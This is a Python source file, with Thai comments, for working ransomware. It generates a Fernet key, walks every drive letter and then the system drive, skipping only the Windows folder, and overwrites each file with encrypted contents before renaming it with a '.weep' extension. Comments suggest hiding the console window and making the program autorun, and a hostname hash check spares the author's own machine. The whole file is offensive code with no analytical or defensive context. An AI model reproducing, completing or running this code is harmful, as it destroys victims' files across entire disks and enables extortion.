import os, subprocess, time, hashlib
from cryptography.fernet import Fernet
#อาจจะต้อง task kill process ที่ไม่ใช่เราทเเละ window ทั้งหมดด้วย เพื่อ ให้ไม่เออเร่อว่ากำลังอ่านไฟล์อยู่
#ไม่ให้จอ cmd เด้งออกมา pyinstaller --noconsole --onefile
# make it autorun 
class encrypt(object):
    """
    docstring
    """
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)
        with open('keyfile.txt','wb+') as f:
            f.write(self.key)

    @staticmethod
    def generatedirlist():
        """
        generate a to z and call findext every loop from a to z
        using drives parameter
        """
        for i in range(65,65+26):
            yield chr(i)+":\\"

    def encrypt(self,data):
        return self.cryptor.encrypt(data)
    def FindMainDrive(self):# Stable!
        """
        return a letter that is a system drive.
        """
        cmd ="echo %SystemRoot%"
        p = subprocess.run(cmd,shell=True,encoding='utf-8',capture_output=True) # return CompletedProcess Class
        if p.stderr!="":
            if os.path.exists('errorfile.txt'):
                writemode ='a'
            else:
                writemode ='w'
            with open('errorfile.txt',writemode,encoding='utf-8') as f:
                f.write(p.stderr)
                f.write('\n')
        return p.stdout.split(':')[0]    

    def run(self):
        """
        this should encrypt all drive except drive c
        run this first
        then run encrypt c
        """
        exclude = self.FindMainDrive()
        path = [i for i in encrypt.generatedirlist() if i.lower() != exclude.lower()+':\\']                 #comment this line for test
        for i in path:                                                                                      #comment this line for test
            for root,_,files in os.walk(i):                                                                 #change i to '.' for test 
                for name in files:
                    if name!='keyfile.txt':
                        walkingdir = os.path.join(root,name)
                        # ########################################TESTTESTTESTTEST
                        # เทสว่า keyfile.txt โดนเว้นจริงปาว ตอบ จริง เทสผ่านน Tested!!!
                        # with open('testencryptNOTC.txt','a',encoding='utf-8')as f:
                        #     f.write(walkingdir+'\n')
                        # #########################################TESTTESTTESTTEST
                        
                        #   use try block here with with block
                        try:
                            with open(walkingdir,'rb+') as f:
                                data = f.read()
                                f.seek(0)
                                f.truncate()
                                f.write(self.encrypt(data))
                            os.rename(walkingdir,walkingdir+'.weep')
                        except Exception as exception:
                            if os.path.exists('errorfile.txt'):
                                writemode ='a'
                            else:
                                writemode ='w'
                            with open('errorfile.txt',writemode,encoding='utf-8') as f:
                                f.write(str(exception))
                                f.write('\n')
    def runinC(self):
        """
        This should encrypt maindrive except for Windows directory
        """
        OnlyDrive = self.FindMainDrive()
        exclude =set(['Windows']) #exclude these dir is working Tested!!!
        for root,dirs,files in os.walk(OnlyDrive+':\\'):
            dirs[:] = [d for d in dirs if d not in exclude]

            # with open('testExcludedir.txt','a',encoding='utf-8')as f:
            #     for name in files:
            #         f.write(os.path.join(root,name)+'\n')
            for name in files:
                if name!='keyfile.txt':
                    walkingdir = os.path.join(root,name)
                    #   use try block here with with block
                    try:
                        with open(walkingdir,'rb+') as f:
                            data = f.read()
                            f.seek(0)
                            f.truncate()
                            f.write(self.encrypt(data))
                        os.rename(walkingdir,walkingdir+'.weep')
                    except Exception as exception:
                        if os.path.exists('errorfile.txt'):
                            writemode ='a'
                        else:
                            writemode ='w'
                        with open('errorfile.txt',writemode,encoding='utf-8') as f:
                            f.write(str(exception))
                            f.write('\n')
    @staticmethod
    def EmergencyBreak():
        cmd ='hostname'
        p = subprocess.run(cmd,shell=True,encoding='utf-8',capture_output=True)
        return p.stdout[:-1]
                
if __name__ == "__main__":
    hash = hashlib.md5(encrypt.EmergencyBreak().encode('utf-8')).hexdigest()
    try:
        if hash =='8abe12940cc6d19c7984cbe78ebe6213':#break on my machine                             #Comment this line for test 
            exit()                                                                                        #Comment this line for test
        testobj = encrypt()
        testobj.run()
        testobj.runinC()                                                                                  #Comment this line for test
    except Exception as exception:
        if os.path.exists('errorfile.txt'):
            writemode = 'a'
        else:
            writemode ='w'
        with open('errorfile.txt',writemode,encoding='utf-8')as f:
            f.write(str(exception))
            f.write('\n')    